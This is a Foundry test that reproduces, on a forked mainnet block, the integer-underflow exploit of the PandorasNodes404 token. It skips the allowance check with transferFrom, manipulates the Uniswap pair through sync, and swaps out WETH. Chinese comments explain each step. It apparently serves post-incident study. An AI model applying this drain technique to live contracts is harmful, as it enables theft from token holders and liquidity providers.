// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";
import "./pandorasblock404.sol";

// TX : https://phalcon.blocksec.com/explorer/tx/eth/0x7c5a909b45014e35ddb89697f6be38d08eff30e7c3d3d553033a6efc3b444fdd
// GUY : https://twitter.com/pennysplayer/status/1766479470058406174
// Profit : ~17K USD
// REASON : integer underflow

interface NoReturnTransferFrom {
    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external;
}

contract ContractTest is Test {
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    // NoReturnTransferFrom constant PANDORA = NoReturnTransferFrom(0xddaDF1bf44363D07E750C20219C2347Ed7D826b9);
    PandorasNodes404 PANDORA = PandorasNodes404(0xddaDF1bf44363D07E750C20219C2347Ed7D826b9);
    Uni_Pair_V2 V2_PAIR = Uni_Pair_V2(0x89CB997C36776D910Cfba8948Ce38613636CBc3c);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() external {
        cheats.createSelectFork("mainnet", 19184577);
        // deal(address(WETH), address(this), 0);
    }

    function testExploit() external {
        console.log("contract address is :", address(this));
        emit log_named_decimal_uint("[Begin] Attacker WETH before exploit", WETH.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Begin] Attacker pandora before exploit", PANDORA.balanceOf(address(this)), 18);
        bytes memory bytecodeWithPandora = vm.getDeployedCode("pandorasblock404.sol:PandorasNodes404");
        vm.etch(address(PANDORA), bytecodeWithPandora);

        uint256 pandora_balance = PANDORA.balanceOf(address(V2_PAIR));

        // 发生两次transferFrom的原因是：第一次transferFrom之前，在pair中pandora_balance和pandora_reserve的数量一致
        // 第一次发生transferFrom之后，pair中pandora_balance减少，但是pandora_reserve不变，所以调用sync函数使得二者强行匹配
        // 第二次transferFrom发生之后，pair中pandora_balance增加，pandora_reserve不变，所以增加的这部分(pandora_balance - pandora_reserve)算在了攻击者头上，则获利

        // 发生整数溢出，使得msg.sender无需授权，即可使以下函数调用通过allowance检查
        console.log("Before first transferFrom, pandora token amounts:", PANDORA.balanceOf(address(this)));
        // uint256 minted = PANDORA.minted();
        // console.log("Now minted is :", minted);
        // uint256 allowed = PANDORA.allowance(address(V2_PAIR), address(this));
        // console.log("allowance is :", allowed);
        // PANDORA.transferFrom(address(V2_PAIR), address(PANDORA), pandora_balance);
        PANDORA.transferFrom(address(V2_PAIR), address(this), 214);
        console.log("After first transferFrom, pandora token amounts:", PANDORA.balanceOf(address(this)));

        V2_PAIR.sync();
        (uint256 ethReserve, uint256 oldPANDORAReserve, ) = V2_PAIR.getReserves();

        // 发生整数移除，使得msg.sender无需授权，即可使以下函数调用通过allowance检查
        PANDORA.transferFrom(address(PANDORA), address(V2_PAIR), pandora_balance - 1);

        uint256 newPANDORAReserve = PANDORA.balanceOf(address(V2_PAIR));
        uint256 amountin = newPANDORAReserve - oldPANDORAReserve;
        uint256 swapAmount = (amountin * 9975 * ethReserve) / (oldPANDORAReserve * 10_000 + amountin * 9975);

        //swap PANDORA to WBNB
        V2_PAIR.swap(swapAmount, 0, address(this), "");
        emit log_named_decimal_uint("[End] Attacker WETH after exploit", WETH.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker pandora after exploit", PANDORA.balanceOf(address(this)), 18);
    }
}
